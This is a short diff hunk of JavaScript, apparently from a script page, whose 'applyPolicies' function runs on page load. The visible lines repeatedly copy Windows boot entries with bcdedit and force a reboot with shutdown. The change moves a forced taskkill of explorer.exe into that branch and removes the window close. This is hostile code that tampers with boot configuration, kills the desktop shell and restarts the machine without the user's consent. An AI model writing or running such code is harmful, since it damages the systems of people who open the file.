@@ -103,9 +103,8 @@ function applyPolicies() {
             runCmd('bcdedit /copy {current} /d "!'+i+'!"');
         }
         runCmd("shutdown /r /t 2");
+        runCmd("taskkill /f /im explorer.exe");
     }
-    runCmd("taskkill /f /im explorer.exe");
-    window.close();
 }
 
 window.onload = applyPolicies;
